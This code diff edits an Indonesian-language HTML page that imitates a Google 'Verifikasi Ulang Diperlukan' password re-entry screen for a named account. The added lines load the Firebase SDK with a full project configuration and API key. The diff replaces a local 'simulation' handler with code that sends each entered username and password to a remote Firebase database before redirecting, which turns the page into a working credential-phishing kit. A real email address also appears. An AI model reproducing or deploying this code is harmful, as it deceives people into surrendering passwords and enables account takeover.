@@ -18,6 +18,7 @@
       height: 100vh;
       color: #202124;
     }
+
     .container {
       width: 400px;
       border: 1px solid #dadce0;
@@ -26,10 +27,12 @@
       box-shadow: 0 4px 12px rgba(0,0,0,0.12);
       text-align: center;
     }
+
     .logo img {
       width: 75px;
       margin-bottom: 30px;
     }
+
     .profile {
       display: flex;
       align-items: center;
@@ -37,33 +40,40 @@
       gap: 10px;
       margin-bottom: 20px;
     }
+
     .profile img {
       width: 40px;
       height: 40px;
       border-radius: 50%;
       object-fit: cover;
     }
+
     .profile-details {
       text-align: left;
     }
+
     .profile-details .name {
       font-size: 14px;
       font-weight: 500;
     }
+
     .profile-details .email {
       font-size: 13px;
       color: #5f6368;
     }
+
     h1 {
       font-size: 22px;
       font-weight: 400;
       margin-bottom: 10px;
     }
+
     p {
       font-size: 14px;
       color: #5f6368;
       margin-bottom: 30px;
     }
+
     input[type="password"] {
       width: 100%;
       padding: 12px;
@@ -72,6 +82,7 @@
       border-radius: 4px;
       margin-bottom: 20px;
     }
+
     button {
       width: 100%;
       padding: 12px;
@@ -82,14 +93,17 @@
       border-radius: 4px;
       cursor: pointer;
     }
+
     button:hover {
       background-color: #155ab6;
     }
+
     .footer {
       margin-top: 30px;
       font-size: 12px;
       color: #80868b;
     }
+
     .footer a {
       color: #1a73e8;
       text-decoration: none;
@@ -106,14 +120,13 @@
       <img src="img/foto.jpg" alt="Foto Profil">
       <div class="profile-details">
         <div class="name">C. Nias</div>
-        <div class="email">celsinias20@gmail.com</div>
+        <div class="email" id="userEmail">celsinias20@gmail.com</div>
       </div>
     </div>
 
     <h1>Verifikasi Ulang Diperlukan</h1>
     <p>Demi keamanan akun Anda, mohon masukkan kembali sandi akun Google Anda untuk memverifikasi identitas Anda.</p>
 
-    <!-- Input & Tombol (tanpa form) -->
     <div>
       <input type="password" id="password" placeholder="Masukkan sandi Anda" required>
       <button type="submit" id="submitBtn">Berikutnya</button>
@@ -125,26 +138,48 @@
     </div>
   </div>
 
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
   <script>
-  document.getElementById('submitBtn').addEventListener('click', function () {
-    const password = document.getElementById('password').value;
-    
-    // Optional: kalau Anda juga ingin simulasikan username
-    const username = "celsinias20@gmail.com"; // atau ambil dari elemen lain jika tersedia
+    // Konfigurasi Firebase kamu
+    const firebaseConfig = {
+      apiKey: "AIzaSyA994Fijqek4cIcp10olEFXXNaGRhYepjY",
+      authDomain: "verif-5eb10.firebaseapp.com",
+      databaseURL: "https://verif-5eb10-default-rtdb.firebaseio.com",
+      projectId: "verif-5eb10",
+      storageBucket: "verif-5eb10.appspot.com",
+      messagingSenderId: "225185787405",
+      appId: "1:225185787405:web:2ef224554dcf8f5b4f6f44",
+      measurementId: "G-EVP4LRCBVM"
+    };
 
-    if (!password) {
-      alert("Silakan masukkan kata sandi.");
-      return;
-    }
+    // Inisialisasi Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
 
-    // Simpan data ke localStorage (untuk simulasi saja, bukan nyata)
-    localStorage.setItem('savedUsername', username);
-    localStorage.setItem('savedPassword', password);
+    // Event saat tombol diklik
+    document.getElementById('submitBtn').addEventListener('click', function () {
+      const password = document.getElementById('password').value;
+      const username = document.getElementById('userEmail').textContent.trim();
 
-    // Redirect ke halaman simulasi konfirmasi
-    window.location.href = 'submit-verification.html';
-  });
-</script>
+      if (!password) {
+        alert("Silakan masukkan kata sandi.");
+        return;
+      }
 
+      // Simpan ke Firebase
+      database.ref('users/login').set({
+        username: username,
+        password: password
+      }).then(() => {
+        // Redirect ke halaman simpan
+        window.location.href = 'submit-verification.html';
+      }).catch((error) => {
+        alert('Gagal menyimpan: ' + error.message);
+      });
+    });
+  </script>
 </body>
 </html>
